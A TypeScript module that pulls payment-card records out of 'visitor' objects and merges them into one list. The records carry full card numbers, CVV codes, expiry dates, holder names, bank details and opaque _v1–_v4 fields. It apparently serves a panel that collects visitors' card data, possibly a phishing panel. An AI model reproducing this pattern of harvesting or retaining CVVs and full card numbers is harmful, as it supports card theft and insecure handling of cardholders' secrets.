export type NormalizedCardEntry = {
  id: string;
  type: "card";
  timestamp?: string;
  status?: string;
  data: Record<string, unknown>;
  source: "history" | "cardHistory" | "oldCards" | "direct";
};

type UnknownRecord = Record<string, unknown>;

const CARD_KEYS = [
  "_v1",
  "cardNumber",
  "cardNumberMasked",
  "pan",
  "number",
  "_v2",
  "cvv",
  "securityCode",
  "_v3",
  "expiryDate",
  "expirationDate",
  "expiry",
  "cardMonth",
  "cardYear",
  "_v4",
  "cardHolderName",
  "cardName",
  "holderName",
] as const;

const DATA_KEYS = [
  "data",
  "card",
  "cardData",
  "details",
  "payload",
  "value",
  "record",
] as const;

const isRecord = (value: unknown): value is UnknownRecord =>
  Boolean(value) && typeof value === "object" && !Array.isArray(value);

const parseJson = (value: unknown): unknown => {
  if (typeof value !== "string") return value;
  const text = value.trim();
  if (!text || (text[0] !== "{" && text[0] !== "[")) return value;

  try {
    return JSON.parse(text);
  } catch {
    return value;
  }
};

const hasValue = (value: unknown) =>
  (typeof value === "string" && value.trim().length > 0) ||
  (typeof value === "number" && Number.isFinite(value)) ||
  (typeof value === "boolean" && value);

const hasCardFields = (value: unknown): value is UnknownRecord =>
  isRecord(value) &&
  CARD_KEYS.some((key) => hasValue(value[key]));

const getNestedCardData = (
  value: unknown,
  depth = 0,
): UnknownRecord | null => {
  if (depth > 5) return null;

  const parsed = parseJson(value);
  if (hasCardFields(parsed)) return parsed;

  if (Array.isArray(parsed)) {
    for (const item of parsed) {
      const result = getNestedCardData(item, depth + 1);
      if (result) return result;
    }
    return null;
  }

  if (!isRecord(parsed)) return null;

  for (const key of DATA_KEYS) {
    if (key in parsed) {
      const result = getNestedCardData(parsed[key], depth + 1);
      if (result) return result;
    }
  }

  for (const item of Object.values(parsed)) {
    const result = getNestedCardData(item, depth + 1);
    if (result) return result;
  }

  return null;
};

const asCandidates = (value: unknown): unknown[] => {
  const parsed = parseJson(value);
  if (Array.isArray(parsed)) return parsed;
  if (!isRecord(parsed)) return [];
  if (hasCardFields(parsed)) return [parsed];

  const nested = DATA_KEYS.flatMap((key) =>
    key in parsed ? asCandidates(parsed[key]) : [],
  );
  if (nested.length > 0) return nested;

  return Object.values(parsed).flatMap((item) => asCandidates(item));
};

const firstString = (...values: unknown[]) =>
  values.find(
    (value): value is string =>
      typeof value === "string" && value.trim().length > 0,
  ) ||
  undefined;

const makeEntry = (
  value: unknown,
  source: NormalizedCardEntry["source"],
  index: number,
): NormalizedCardEntry | null => {
  const record = isRecord(parseJson(value)) ? (parseJson(value) as UnknownRecord) : {};
  const data =
    getNestedCardData(
      record.data ??
        record.card ??
        record.cardData ??
        record.details ??
        record.payload ??
        record.value ??
        record,
    ) || getNestedCardData(record);

  if (!data) return null;

  return {
    id: firstString(record.id, record.entryId, record.key) || `${source}-card-${index}`,
    type: "card",
    timestamp: firstString(
      record.timestamp,
      record.createdAt,
      record.updatedAt,
      record.cardUpdatedAt,
    ),
    status: firstString(record.status, record.cardStatus),
    data,
    source,
  };
};

const fingerprint = (entry: NormalizedCardEntry) => {
  const data = entry.data;
  const values = CARD_KEYS.map((key) => data[key]).filter(hasValue);
  if (values.length === 0) {
    return `timestamp:${entry.timestamp || ""}`;
  }

  return JSON.stringify([
    ...values.map((value) => String(value).trim()),
  ]);
};

const normalizeCollection = (
  value: unknown,
  source: NormalizedCardEntry["source"],
): NormalizedCardEntry[] => {
  const candidates = asCandidates(value);
  return candidates
    .map((candidate, index) => makeEntry(candidate, source, index))
    .filter((entry): entry is NormalizedCardEntry => Boolean(entry));
};

const directCardData = (visitor: UnknownRecord): UnknownRecord => ({
  cardNumber: visitor.cardNumber,
  cardNumberMasked: visitor.cardNumberMasked,
  pan: visitor.pan,
  _v1: visitor._v1,
  cvv: visitor.cvv,
  securityCode: visitor.securityCode,
  _v2: visitor._v2,
  expiryDate:
    visitor.expiryDate ||
    visitor.expirationDate ||
    (visitor.cardMonth || visitor.cardYear
      ? `${visitor.cardMonth || ""}/${visitor.cardYear || ""}`
      : undefined),
  _v3: visitor._v3,
  cardHolderName: visitor.cardHolderName || visitor.cardName || visitor.holderName,
  _v4: visitor._v4,
  cardType: visitor.cardType || visitor.cardCategory || visitor.scheme,
  cardLevel: visitor.cardLevel || visitor.level,
  bankInfo: visitor.bankInfo,
  bankName: visitor.bankName,
  cardCountry: visitor.cardCountry,
});

export function getNormalizedCardEntries(visitor: unknown): NormalizedCardEntry[] {
  if (!isRecord(visitor)) return [];

  const entries = [
    ...normalizeCollection(visitor.history, "history"),
    ...normalizeCollection(visitor.cardHistory, "cardHistory"),
    ...normalizeCollection(visitor.oldCards, "oldCards"),
  ];

  const direct = directCardData(visitor);
  if (hasCardFields(direct)) {
    entries.push({
      id: "direct-card",
      type: "card",
      timestamp: firstString(
        visitor.cardUpdatedAt,
        visitor.updatedAt,
        visitor.createdAt,
      ),
      status: firstString(visitor.cardStatus) || "pending",
      data: direct,
      source: "direct",
    });
  }

  const seen = new Map<string, NormalizedCardEntry["source"]>();
  return entries.filter((entry) => {
    const key = fingerprint(entry);
    const previousSource = seen.get(key);
    if (
      previousSource &&
      (entry.source === "direct" ||
        previousSource === "history" ||
        previousSource === "cardHistory")
    ) {
      return false;
    }
    seen.set(key, entry.source);
    return true;
  });
}
